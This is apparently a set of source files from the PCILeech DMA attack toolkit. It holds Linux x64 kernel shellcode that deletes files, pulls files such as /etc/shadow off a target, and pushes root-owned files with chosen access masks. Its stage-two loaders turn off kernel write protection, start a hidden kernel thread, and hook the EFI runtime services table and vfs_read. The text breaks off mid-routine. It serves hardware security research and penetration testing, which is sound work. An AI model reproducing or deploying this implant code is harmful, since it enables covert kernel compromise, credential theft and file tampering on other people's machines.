	MOV rax, rcx
	PUSH rdi
	PUSH rsi

	MOV rdi, rdx
	MOV rsi, r8
	MOV rdx, r9
	MOV rcx, [rsp+28h+2*8+00h] ; 20h stack shadow space + 8h (RET) + 2*8h PUSH + xxh offset
	MOV r8,  [rsp+28h+2*8+08h]
	MOV r9,  [rsp+28h+2*8+10h]

	PUSH r15
	MOV r15, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	CALL rax
	MOV rsp, r15
	POP r15

	POP rsi
	POP rdi
	RET
SysVCall ENDP

; ------------------------------------------------------------------
; WinCall callback function pointer.
; ------------------------------------------------------------------
data_wincall_fnptr dq 0

; ------------------------------------------------------------------
; Set the (windows x64 calling convention compatible) callback function
; to forward callbacks sent to WinCall to.
; NB! This requires the memory to be RWX.
; rcx -> address of kallsyms_lookup_name
; ------------------------------------------------------------------
WinCallSetFunction PROC
	MOV [data_wincall_fnptr], rcx
	RET
WinCallSetFunction ENDP

; ------------------------------------------------------------------
; Convert from the SystemV X64 calling convention (used by Linux)
; to the Windows Windows X64 calling convention.
; Function typically called by the Linux kernel as a callback function.
; The address of the Windows X64 function to forward the call to is
; set by 'WinCallSetFunction'.
; A maximum of six (6) parameters are supported.
; rdi -> rcx
; rsi -> rdx
; rdx -> r8
; rcx -> r9
; r8  -> stack
; r9  -> stack
; ------------------------------------------------------------------
WinCall PROC
	PUSH r15
	MOV r15, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h

	PUSH r9
	PUSH r8
	SUB rsp, 020h
	MOV r9, rcx
	MOV r8, rdx
	MOV rdx, rsi
	MOV rcx, rdi

	MOV rax, [data_wincall_fnptr]
	CALL rax
	MOV rsp, r15
	POP r15
	RET
WinCall ENDP

; ------------------------------------------------------------------
; Convert a physical address to a virtual address (Linux)
; Function uses Windows calling convention (rcx = 1st param)
; ------------------------------------------------------------------
m_phys_to_virt PROC
	MOV rax, 0ffff880000000000h
	ADD rax, rcx
	RET
m_phys_to_virt ENDP

; ------------------------------------------------------------------
; Convert a struct_page to to a physical address (Linux)
; Function uses Windows calling convention (rcx = 1st param)
; ------------------------------------------------------------------
m_page_to_phys PROC
	MOV rax, 0ffffea0000000000h
	SUB rcx, rax
	SHR rcx, 7		; PFN
	SHL rcx, 12
	MOV rax, rcx
	RET
m_page_to_phys ENDP

; ----------------------------------------------------
; Flush the CPU cache.
; ----------------------------------------------------
CacheFlush PROC
	WBINVD
	RET
CacheFlush ENDP

END
```

`pcileech_shellcode/lx64_filedelete.c`:

```c
// lx64_filedelete.c : kernel code to delete files from target system.
// Compatible with Linux x64.
//
// (c) Ulf Frisk, 2016-2021
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_filedelete.c
// ml64 lx64_common_a.asm /Felx64_filedelete.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main lx64_filedelete.obj lx64_common.obj
// shellcode64.exe -o lx64_filedelete.exe "DELETE FILE ON TARGET SYSTEM                                   \nLINUX X64 EDITION                                              \n===============================================================\nDelete a specified file on the target system.                  \nREQUIRED OPTIONS:                                              \n  -s   : file on target system.                                \n         Example: '-s /tmp/file2delete'                        \n  -0   : run flag - set to non zero to delete file.            \n===== DETAILED RESULT INFORMATION =============================\nFILE NAME     : %s\nRESULT CODE   : 0x%08X\n==============================================================="
// 

#include "lx64_common.h"

typedef struct tdFN2 {
    QWORD memcpy;
	QWORD sys_unlink;
} FN2, *PFN2;

typedef struct tdFN3 {
    QWORD memcpy;
    QWORD getname;
    QWORD getname_kernel;
    QWORD do_unlinkat;
} FN3, *PFN3;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD NAMES[2];
    CHAR str_memcpy[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
	CHAR str_sys_unlink[] = { 's', 'y', 's', '_', 'u', 'n', 'l', 'i', 'n', 'k', 0 };
    NAMES[0] = (QWORD)str_memcpy;
	NAMES[1] = (QWORD)str_sys_unlink;
	return LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn2, 2);
}

BOOL LookupFunctions3(PKMDDATA pk, PFN3 pfn3)
{
    QWORD NAMES[4];
    CHAR str_memcpy[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
    CHAR str_getname[] = { 'g', 'e', 't', 'n', 'a', 'm', 'e', 0 };
    CHAR str_getname_kernel[] = { 'g', 'e', 't', 'n', 'a', 'm', 'e', '_', 'k', 'e', 'r', 'n', 'e', 'l', 0 };
    CHAR str_do_unlinkat[] = { 'd', 'o', '_', 'u', 'n', 'l', 'i', 'n', 'k', 'a', 't', 0 };
    NAMES[0] = (QWORD)str_memcpy;
    NAMES[1] = (QWORD)str_getname;
    NAMES[2] = (QWORD)str_getname_kernel;
    NAMES[3] = (QWORD)str_do_unlinkat;
    return LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn3, 4);
}

#define AT_FDCWD       -100

VOID c_EntryPoint(PKMDDATA pk)
{
    BOOL f2, f3;
	FN2 fn2;
    FN3 fn3;
	QWORD qwResult;
    QWORD qwFileNamePtr;
    f2 = LookupFunctions2(pk, &fn2);
    f3 = LookupFunctions3(pk, &fn3);
	if(!f2 && !f3) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
    SysVCall((f2 ? fn2.memcpy : fn3.memcpy), pk->dataOutStr, pk->dataInStr, MAX_PATH);
    if(!pk->dataIn[0]) {
        pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
        return;
    }
    if(f2) {
        qwResult = SysVCall(fn2.sys_unlink, pk->dataInStr);
    } else {
        qwFileNamePtr = SysVCall(fn3.getname_kernel ? fn3.getname_kernel : fn3.getname, pk->dataInStr);
        qwResult = SysVCall(fn3.do_unlinkat, AT_FDCWD, qwFileNamePtr);
    }
	if(qwResult) {
		pk->dataOut[0] = STATUS_FAIL_ACTION;
		return;
	}
}
```

`pcileech_shellcode/lx64_filepull.c`:

```c
// lx64_filepull.c : kernel code to pull files from target system.
// Compatible with Linux x64.
//
// (c) Ulf Frisk, 2016-2021
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_filepull.c
// ml64 lx64_common_a.asm /Felx64_filepull.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main lx64_filepull.obj lx64_common.obj
// shellcode64.exe -o lx64_filepull.exe "PULL FILES FROM TARGET SYSTEM                                  \nLINUX X64 EDITION                                              \n===============================================================\nPull a file from the target system to the local system.        \nREQUIRED OPTIONS:                                              \n  -out : file on local system to write result to.              \n         filename is given in normal format.                   \n         Example: '-out c:\temp\shadow'                        \n  -s : file on target system.                                  \n         Example: '-s /etc/shadow'                             \n===== PULL ATTEMPT DETAILED RESULT INFORMATION ================\nFILE NAME     : %s\nRESULT CODE   : 0x%08X\n===============================================================\n"
// 

#include "lx64_common.h"

#define O_RDONLY        00000000

typedef struct tdFN2 {
	QWORD filp_close;
	QWORD filp_open;
	QWORD vfs_read;
	QWORD kernel_read;
	QWORD memcpy;
} FN2, *PFN2;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD NAMES[5];
	CHAR str_filp_close[] = {'f', 'i', 'l', 'p', '_', 'c', 'l', 'o', 's', 'e', 0};
	CHAR str_filp_open[] = { 'f', 'i', 'l', 'p', '_', 'o', 'p', 'e', 'n', 0 };
	CHAR str_vfs_read[] = { 'v', 'f', 's', '_', 'r', 'e', 'a', 'd', 0 };
	CHAR str_kernel_read[] = { 'k', 'e', 'r', 'n', 'e', 'l', '_', 'r', 'e', 'a', 'd', 0 };
	CHAR str_memcpy[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
	NAMES[0] = (QWORD)str_filp_close;
	NAMES[1] = (QWORD)str_filp_open;
	NAMES[2] = (QWORD)str_vfs_read;
	NAMES[3] = (QWORD)str_kernel_read;
	NAMES[4] = (QWORD)str_memcpy;
	return LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn2, 5);
}

VOID c_EntryPoint(PKMDDATA pk)
{
	FN2 fn2;
	QWORD hFile, qwOffset = 0;
	BOOL isModeLargeTransfer = FALSE;
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	SysVCall(fn2.memcpy, pk->dataOutStr, pk->dataInStr, MAX_PATH);
	hFile = SysVCall(fn2.filp_open, pk->dataInStr, O_RDONLY, pk->dataIn[0]);
	if(hFile > 0xffffffff00000000) {
		pk->dataOut[0] = STATUS_FAIL_FILE_CANNOT_OPEN;
		return;
	}
	while(TRUE) {
		pk->dataOutExtraLength = SysVCall(
			fn2.kernel_read ? fn2.kernel_read : fn2.vfs_read,
			hFile,
			pk->DMAAddrVirtual + pk->dataOutExtraOffset,
			pk->dataOutExtraLengthMax,
			&qwOffset
		);
		if(pk->dataOutExtraLength < pk->dataOutExtraLengthMax) {
			break;
		}
		isModeLargeTransfer = TRUE;
		if(!WriteLargeOutput_WaitNext(pk)) {
			pk->dataOutExtraLength = 0;
			pk->dataOut[0] = STATUS_FAIL_PCILEECH_CORE;
			SysVCall(fn2.filp_close, hFile, NULL);
			return;
		}
	}
	if(isModeLargeTransfer) {
		WriteLargeOutput_Finish(pk);
	}
	SysVCall(fn2.filp_close, hFile, NULL);
}
```

`pcileech_shellcode/lx64_filepush.c`:

```c
// lx64_filepush.c : kernel code to push files to target system.
// Compatible with Linux x64.
//
// (c) Ulf Frisk, 2016-2021
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_filepush.c
// ml64 lx64_common_a.asm /Felx64_filepush.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main lx64_filepush.obj lx64_common.obj
// shellcode64.exe -o lx64_filepush.exe "PUSH FILES TO TARGET SYSTEM                                    \nLINUX X64 EDITION                                              \n===============================================================\nPush a file from the local system to the target system.        \nWARNING! Existing files will be overwritten!                   \n* Files created will be created with root as owner/group and get\n  the access mask specified in the -0 parameter.               \n* Files overwritten will keep the access mask and owner/group. \nREQUIRED OPTIONS:                                              \n  -in  : file to push to target system from this system.       \n         filename is given in normal format.                   \n         Example: '-in c:\temp\shadow'                         \n  -s : file on target system.                                  \n         Example: '-s /etc/shadow'                             \n  -0   : file access mask in HEXADECIMAL OR DECIMAL FORMAT!    \n         NB! linux file masks are ususally typed in octal -    \n         -rwsr-xr-x 4755 (oct) = 2541 (decimal) = 0x9ed (hex)  \n         -rwxrwxrwx  777 (oct) =  511 (decimal) = 0x1ff (hex)  \n         Example: '-0 0x1ff'                                   \n  -1   : run flag - set to non zero to push file.              \n===== PUSH ATTEMPT DETAILED RESULT INFORMATION ================\nFILE NAME     : %s\nRESULT CODE   : 0x%08X\nBYTES WRITTEN : 0x%08X\n===============================================================\n"
// 

#include "lx64_common.h"

#define O_WRONLY        00000001
#define O_CREAT         00000100
#define O_TRUNC         00001000

typedef struct tdFN2 {
	QWORD filp_close;
	QWORD filp_open;
	QWORD vfs_write;
	QWORD kernel_write;
	QWORD memcpy;
} FN2, *PFN2;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD NAMES[5];
	CHAR str_filp_close[] = { 'f', 'i', 'l', 'p', '_', 'c', 'l', 'o', 's', 'e', 0 };
	CHAR str_filp_open[] = { 'f', 'i', 'l', 'p', '_', 'o', 'p', 'e', 'n', 0 };
	CHAR str_vfs_write[] = { 'v', 'f', 's', '_', 'w', 'r', 'i', 't', 'e', 0 };
	CHAR str_kernel_write[] = { 'k', 'e', 'r', 'n', 'e', 'l', '_', 'w', 'r', 'i', 't', 'e', 0 };
	CHAR str_memcpy[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
	NAMES[0] = (QWORD)str_filp_close;
	NAMES[1] = (QWORD)str_filp_open;
	NAMES[2] = (QWORD)str_vfs_write;
	NAMES[3] = (QWORD)str_kernel_write;
	NAMES[4] = (QWORD)str_memcpy;
	return LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn2, 5);
}

VOID c_EntryPoint(PKMDDATA pk)
{
	FN2 fn2;
	QWORD hFile, qwOffset = 0;
	if(!pk->dataIn[1]) {
		pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
		return;
	}
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	SysVCall(fn2.memcpy, pk->dataOutStr, pk->dataInStr, MAX_PATH);
	hFile = SysVCall(fn2.filp_open, pk->dataInStr, O_WRONLY | O_CREAT | O_TRUNC, pk->dataIn[0]);
	if(hFile > 0xffffffff00000000) {
		pk->dataOut[0] = STATUS_FAIL_FILE_CANNOT_OPEN;
		return;
	}
	pk->dataOut[1] = SysVCall(
		fn2.kernel_write ? fn2.kernel_write : fn2.vfs_write,
		hFile,
		pk->DMAAddrVirtual + pk->dataInExtraOffset,
		pk->dataInExtraLength,
		&qwOffset
	);
	SysVCall(fn2.filp_close, hFile, NULL);
}
```

`pcileech_shellcode/lx64_stage2.asm`:

```asm
; lx64_stage2.asm : assembly to receive execution from stage1 shellcode.
; Compatible with Linux x64.
;
; (c) Ulf Frisk, 2016, 2017
; Author: Ulf Frisk, pcileech@frizk.net
;

.CODE

main PROC
	main_pre_start:
	; ----------------------------------------------------
	; 0: INITIAL OP AND VARIABLE MEMORY LOCATIONS
	; ----------------------------------------------------
	JMP main_start 
	data_cmpxchg_flag					db 00h
	data_filler							db 00h
	data_phys_addr_alloc				dd 00000000h						; 4 bytes offset (4 bytes long)
	data_orig_code						dq 0000000000000000h				; 8 bytes offset (8 bytes long)
	data_offset_kallsyms_lookup_name	dd 00000000h						; 16 bytes offset (4 bytes long)
	; ----------------------------------------------------
	; 1: SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
	main_start:
	POP rax
	SUB rax, 5
	PUSH rax
	PUSH rdi
	PUSH rsi
	PUSH rdx
	PUSH rcx
	PUSH r8
	PUSH r9
	; ----------------------------------------------------
	; 2: ENABLE SUPERVISOR WRITE
	; ----------------------------------------------------
	MOV rcx, cr0
	PUSH rcx
	AND ecx, 0fffeffffh
	MOV cr0, rcx
	; ----------------------------------------------------
	; 3: RESTORE ORIGNAL (8 bytes)
	; ----------------------------------------------------
	MOV rdx, [data_orig_code]
	MOV [rax], rdx
	; ----------------------------------------------------
	; 4: ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	LEA rcx, data_cmpxchg_flag
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
	; ----------------------------------------------------
	; 5: SET UP CALL STACK AND PARAMETERS
	;    r12: tmp 1 (virt addr)
	;    r13: tmp 2 (phys addr)
	;    r14: addr to kallsyms_lookup_name
	;    r15: storage for store old stack ptr (rsp)
	; ----------------------------------------------------
	PUSH r12
	PUSH r13
	PUSH r14
	PUSH r15
	MOV r15, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	LEA r14, main_pre_start
	MOV eax, [data_offset_kallsyms_lookup_name]
	ADD r14, rax
	; ----------------------------------------------------
	; 5: CALL C CODE
	; ----------------------------------------------------
	CALL setup
	MOV rsp, r15
	POP r15
	POP r14
	POP r13
	POP r12
	; ----------------------------------------------------
	; 7: RESTORE AND JMP BACK
	; ----------------------------------------------------
	skipcall:
	POP rax
	MOV cr0, rax
	POP r9
	POP r8
	POP rcx
	POP rdx
	POP rsi
	POP rdi
	RET
main ENDP

setup PROC
	; ----------------------------------------------------
	; 0: ALLOC PAGES
	; ----------------------------------------------------
	LEA rdi, str_alloc_pages_current
	CALL r14
	TEST rax, rax
	JZ error
	MOV rdi, 14h
	MOV rsi, 2h
	CALL rax
	TEST rax, rax
	JZ error
	; ----------------------------------------------------
	; 1: RETRIEVE PHYS/VIRT ADDRESSES OF PAGES
	; ----------------------------------------------------
	MOV rdi, rax
	CALL m_page_to_phys
	MOV r13, rax
	MOV rdi, r13
	CALL m_phys_to_virt
	MOV r12, rax
	; ----------------------------------------------------
	; 2: SET CODE PAGE TO EXECUTABLE
	; ----------------------------------------------------
	LEA rax, main
	LEA rdi, str_set_memory_x
	CALL r14
	TEST rax, rax
	JZ error
	MOV rdi, r12
	MOV rsi, 2
	CALL rax
	; ----------------------------------------------------
	; 3: CLEAR AND COPY STAGE3 PRE BINARY TO AREA
	; ----------------------------------------------------
	MOV rdi, r12
	CALL clear_8k
	MOV rdi, 64
	copy_stage3_pre_loop:
	SUB rdi, 8
	LEA rax, lx64_stage3_pre
	MOV rax, [rax+rdi]
	MOV rsi, r12
	ADD rsi, 1000h
	ADD rsi, rdi
	MOV [rsi], rax
	TEST rdi, rdi
	JNZ copy_stage3_pre_loop
	; ----------------------------------------------------
	; 4: CREATE THREAD & SET UP DATA AREA
	; (try kthread_create_on_node 1st, kthread_create 2nd)
	; ----------------------------------------------------
	LEA rdi, str_kthread_create_on_node
	CALL r14
	TEST rax, rax
	JZ thread_kthread_create
	MOV rdi, r12
	ADD rdi, 01000h
	XOR rsi, rsi
	XOR rdx, rdx
	SUB rdx, 1
	LEA rcx, str_pcileech
	CALL rax
	TEST rax, rax
	JZ thread_kthread_create
	JMP thread_start
	thread_kthread_create:
	LEA rdi, str_kthread_create
	CALL r14
	TEST rax, rax
	JZ error
	MOV rdi, r12
	ADD rdi, 01000h
	XOR rsi, rsi
	LEA rdx, str_pcileech
	CALL rax
	TEST rax, rax
	JZ error
	; ----------------------------------------------------
	; 5: START THREAD
	; ----------------------------------------------------
	thread_start:
	MOV [r12+58h], rax   ; KMDDATA.ReservedKMD
	MOV [r12+10h], r14   ; KMDDATA.AddrKallsymsLookupName
	LEA rdi, str_wake_up_process
	CALL r14
	TEST rax, rax
	JZ error
	MOV rdi, [r12+58h]
	CALL rax
	TEST rax, rax
	JZ error
	; ----------------------------------------------------
	; 6: FINISH!
	;    supervisor write must be re-enabled before since
	;    some calls may have unset it.
	; ----------------------------------------------------
	MOV eax, r13d
	JMP setup_finish
	error:
	MOV eax, 0FFFFFFFFh
	setup_finish:
	MOV rcx, cr0
	AND ecx, 0fffeffffh
	MOV cr0, rcx
	MOV [data_phys_addr_alloc], eax
	RET
setup ENDP

; ------------------------------------------------------------------
; Retrieve the PAGE_OFFSET_BASE
; r14 -> kallsyms_lookup_name
; rax <- value of PAGE_OFFSET_BASE
; ------------------------------------------------------------------
m_page_offset_base PROC
	LEA rdi, str_page_offset_base
	CALL r14
	TEST rax, rax
	JZ kaslr_pg_disable
	MOV rax, [rax]
	RET
	kaslr_pg_disable:
	MOV rax, 0ffff880000000000h
	RET
m_page_offset_base ENDP

m_phys_to_virt PROC
	PUSH rdi
	CALL m_page_offset_base
	POP rdi
	ADD rax, rdi
	RET
m_phys_to_virt ENDP

m_vmemmap_base PROC
	LEA rdi, str_vmemmap_base
	CALL r14
	TEST rax, rax
	JZ kaslr_memmap_disable
	MOV rax, [rax]
	RET
	kaslr_memmap_disable:
	MOV rax, 0ffffea0000000000h
	RET
m_vmemmap_base ENDP

m_page_to_phys PROC
	PUSH rdi
	CALL m_vmemmap_base
	POP rdi
	SUB rdi, rax
	SHR rdi, 7		; PFN
	SHL rdi, 12
	MOV rax, rdi
	RET
m_page_to_phys ENDP

; ----------------------------------------------------
; clear_8k
; clear 8192 bytes of memory
; rdi -> starting address
; ----------------------------------------------------
clear_8k PROC
	XOR rax, rax
	MOV ecx, 1024
	CLD
	REP STOSQ [rdi]
	RET
clear_8k ENDP

; ----------------------------------------------------
; This code compiles into 53 bytes. This is copied by
; stage3 area by the setup function.
; Linux cannot use the simpler windows stage3 pre code
; since the thread will get stuck without a sleep.
; ----------------------------------------------------
lx64_stage3_pre PROC
	label_main_base:	
	JMP label_main_loop
	str_msleep db 'msleep', 0
	label_main_loop:
	LEA rdi, str_msleep
	LEA rax, label_main_base-1000h+10h		; KMDDATA.qwAddrKallsymsLookupName
	MOV rax, [rax]
	CALL rax
	MOV rdi, 100
	CALL rax
	LEA rax, label_main_base-8h
	MOV rax, [rax]
	CMP rax, 0
	JZ label_main_loop
lx64_stage3_pre ENDP

str_kthread_create			db 'kthread_create', 0
str_kthread_create_on_node	db 'kthread_create_on_node', 0
str_alloc_pages_current		db 'alloc_pages_current', 0
str_set_memory_x			db 'set_memory_x', 0
str_wake_up_process			db 'wake_up_process', 0
str_page_offset_base		db 'page_offset_base', 0
str_vmemmap_base			db 'vmemmap_base', 0
str_pcileech				db 'pcileech', 0

END

```

`pcileech_shellcode/lx64_stage2_efi.asm`:

```asm
; lx64_stage2_efi.asm : assembly to receive execution from hooked efi runtime services dispatch table.
; Compatible with Linux x64.
;
; (c) Ulf Frisk, 2017
; Author: Ulf Frisk, pcileech@frizk.net
;

;
; the efi runtime services hook will access the linux kernel proper and set up
; a hook in the 'vfs_read' function. The 'vfs_read' function gets called often.
; A harmless kernel Oops will be shown in the process when setting a unaligned
; memory page to executable.
;

.CODE

data_reserved_future_use	dq 0,0,0,0							; [000h offset, 20h size]
data_phys_addr_alloc		dd 0								; [020h offset, 04h size]
data_filler_0				dd 0								; [024h offset, 04h size]
data_addr_runtserv			dq 0								; [028h offset, 08h size]
data_runtserv_table_fn		dq 0,0,0,0,0,0,0,0,0,0,0,0,0,0		; [030h offset, 70h size]
data_debug0					dq 0								; [0a0h offset, 08h size]
data_debug1					dq 0								; [0a8h offset, 08h size]
data_debug2					dq 0								; [0b0h offset, 08h size]
data_debug3					dq 0								; [0b8h offset, 08h size]
addr_vmemmap_base			dq 0								; [0c0h offset, 08h size]
addr_kthread_create_on_node	dq 0								; [0c8h offset, 08h size]
addr_wake_up_process		dq 0								; [0d0h offset, 08h size]
addr_page_offset_base		dq 0								; [0d8h offset, 08h size]
addr_alloc_pages_current	dq 0								; [0e0h offset, 08h size]
addr_set_memory_x			dq 0								; [0e8h offset, 08h size]
addr_vfs_read				dq 0								; [0f0h offset, 08h size]
addr_kallsyms_lookup_name	dq 0								; [0f8h offset, 08h size]

; ----------------------------------------------------
; ENTRY POINT:
; 100h offset
; UEFI x64 calling convention is assumed upon entry.
; volatile :: rax, rcx, rdx, r8, r9, r10, r11
; arguments in :: rcx, rdx, r8, r9
; ----------------------------------------------------
main PROC
	; ----------------------------------------------------
	; 1: LANDING POINT FOR HOOKED EFI RUNTIME SERVICES (RUNTSERV) TABLE.
	;    (depending on which of the _14_ functions are hooked execution
	;    will land on different position.
	; ----------------------------------------------------
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	PUSH 0
	; ----------------------------------------------------
	; 2: FETCH CALLER AND CALLEE ADDRESSES.
	; ----------------------------------------------------
	MOV r11, 14
	loop_count:
	DEC r11
	POP rax
	TEST rax, rax
	JZ loop_count
	PUSH rax
	MOV r10, rax
	LEA rax, data_runtserv_table_fn
	PUSH [rax + 8*r11 + 8]
	; ----------------------------------------------------
	; 3: SAVE ORIGINAL PARAMETERS.
	; ----------------------------------------------------
	PUSH rdi
	PUSH rsi
	PUSH rcx
	PUSH rdx
	PUSH r8
	PUSH r9
	PUSH rbx
	PUSH rbp
	PUSH r12
	PUSH r13
	PUSH r14
	PUSH r15
	; ----------------------------------------------------
	; 4: RESTORE ORIGNAL RUNTSERV TABLE.
	; ----------------------------------------------------
	MOV rcx, 14
	loop_restore:
	DEC rcx
	LEA rax, data_runtserv_table_fn
	MOV rdx, [rax + 8*rcx]
	MOV rax, [data_addr_runtserv]
	MOV [rax + 18h + 8*rcx], rdx
	TEST rcx, rcx
	JNZ loop_restore
	; ----------------------------------------------------
	; 5: FIND SYMBOLS AND CALL SETUP CODE.
	; ----------------------------------------------------
	MOV rcx, r10
	CALL find_kallsyms
	CALL find_symbols
	CALL setup_uefi_rt
	; ----------------------------------------------------
	; 6: RESTORE AND JMP TO ORIGINAL INTENDED TARGET.
	; ----------------------------------------------------
	POP r15
	POP r14
	POP r13
	POP r12
	POP rbp
	POP rbx
	POP r9
	POP r8
	POP rdx
	POP rcx
	POP rsi
	POP rdi
	POP rax
	MOV [data_debug1], rax
	JMP rax
main ENDP

; ----------------------------------------------------
; Locate address of kallsyms_lookup_name.
; rcx -> address in kernel
; volatile :: rax, r13, r14, r15
; ----------------------------------------------------
find_kallsyms PROC
	; ----------------------------------------------------
	; 1: Search for string: 'kallsyms_lookup_name'.
	; ----------------------------------------------------
	LEA rax, str_kallsyms
	MOV r13, [rax]
	MOV r14, [rax+8]
	MOV r15, [rax+14]
	kallsyms_find_str_loop:
	INC rcx
	MOV rax, [rcx]
	CMP rax, r13
	JNE kallsyms_find_str_loop
	MOV rax, [rcx+8]
	CMP rax, r14
	JNE kallsyms_find_str_loop
	MOV rax, [rcx+16-2]
	CMP rax, r15
	JNE kallsyms_find_str_loop
	INC rcx
	; ----------------------------------------------------
	; 2: Search for address to string previously found.
	; ----------------------------------------------------
	; rcx == address of str kallsyms_lookup_name -> r15
	MOV r15, rcx
	SHR rcx, 3
	SHL rcx, 3
	kallsyms_find_addr_loop:
	SUB rcx, 8
	MOV rax, [rcx]
	CMP rax, r15
	JNZ kallsyms_find_addr_loop
	; ----------------------------------------------------
	; 3: Return fn address of kallsyms_lookup_name.
	; ----------------------------------------------------
	MOV rax, [rcx-08h]
	MOV [addr_kallsyms_lookup_name], rax
	RET
find_kallsyms ENDP

; ----------------------------------------------------
; Locate required symbols (kallsyms_lookup_name must be known).
; volatile :: rax, rdi
; ----------------------------------------------------
find_symbols PROC
	PUSH r15
	MOV r15, [addr_kallsyms_lookup_name]
	; addr_vfs_read
	LEA rdi, str_vfs_read
	CALL r15
	MOV [addr_vfs_read], rax
	; addr_set_memory_x
	LEA rdi, str_set_memory_x
	CALL r15
	MOV [addr_set_memory_x], rax
	; addr_alloc_pages_current
	LEA rdi, str_alloc_pages_current
	CALL r15
	MOV [addr_alloc_pages_current], rax
	; addr_page_offset_base
	LEA rdi, str_page_offset_base
	CALL r15
	MOV [addr_page_offset_base], rax
	; addr_vmemmap_base
	LEA rdi, str_vmemmap_base
	CALL r15
	MOV [addr_vmemmap_base], rax
	; addr_kthread_create_on_node
	LEA rdi, str_kthread_create_on_node
	CALL r15
	MOV [addr_kthread_create_on_node], rax
	; addr_wake_up_process
	LEA rdi, str_wake_up_process
	CALL r15
	MOV [addr_wake_up_process], rax
	POP r15
	RET
find_symbols ENDP

; ----------------------------------------------------
; Setup stage2 area and hook kernel proper.
; r14 -> address of kallsyms_lookup_name
; r11 :: address of vfs_read (virt addr/hook fn)
; r12 :: alloc pg (virt addr)
; r13 :: alloc pg (phys addr)
; ----------------------------------------------------
setup_uefi_rt PROC
	; ----------------------------------------------------
	; 1: ALLOC 1 PAGE FOR CODE TO BE CALLED BY KERNEL.
	; ----------------------------------------------------
	MOV rdi, 14h
	MOV rsi, 0h
	CALL [addr_alloc_pages_current]
	; ----------------------------------------------------
	; 2: RETRIEVE PHYS/VIRT ADDRESSES OF PAGE.
	; ----------------------------------------------------
	MOV rdi, rax
	CALL m_page_to_phys
	MOV r13, rax
	MOV rdi, r13
	CALL m_phys_to_virt
	MOV r12, rax
	MOV [data_debug1], r13		; debug
	MOV [data_debug2], r12		; debug
	; ----------------------------------------------------
	; 3: PATCH HOOK SHELLCODE.
	; ----------------------------------------------------
	; patch shellcode absolute virtual location
	LEA rax, hook_shellcode + 06h
	LEA rdx, hook_kernel_fn_landing_point
	AND rdx, 0fffh
	ADD rdx, r12
	MOV [rax], rdx
	; patch relative addr to set_memory_x
	MOV rdx, [addr_vfs_read]		; addr from
	ADD rdx, 19h
	MOV rcx, [addr_set_memory_x]	; addr to
	SUB ecx, edx					; addr rel (used in call)
	LEA rax, hook_shellcode + 15h
	MOV [rax], ecx
	; ----------------------------------------------------
	; 4: SAVE ORIGINAL BYTES OF HOOK FUNCTION.
	; ----------------------------------------------------
	XOR rcx, rcx
	MOV r8, [addr_vfs_read]
	LEA r9, data_hook_original_32
	hook_fn_copy_loop:
	MOV rax, [r8 + rcx]
	MOV [r9 + rcx], rax
	ADD rcx, 8
	CMP rcx, 32
	JNE hook_fn_copy_loop
	; ----------------------------------------------------
	; 5: COPY PAGE TO ALLOC'ED LOCATION.
	; ----------------------------------------------------
	XOR rcx, rcx
	LEA r8, main
	SHR r8, 12
	SHL r8, 12
	page_copy_loop:
	MOV rax, [r8 + rcx]
	MOV [r12 + rcx], rax
	ADD rcx, 8
	CMP rcx, 1000h
	JNE page_copy_loop
	; ----------------------------------------------------
	; 5: ENABLE SUPERVISOR WRITE.
	; ----------------------------------------------------
	MOV rax, cr0
	MOV r15, rax
	AND eax, 0fffeffffh
	MOV cr0, rax
	; ----------------------------------------------------
	; 6: PATCH KERNEL 'vfs_read'.
	; ----------------------------------------------------
	XOR rcx, rcx
	MOV r8, [addr_vfs_read]
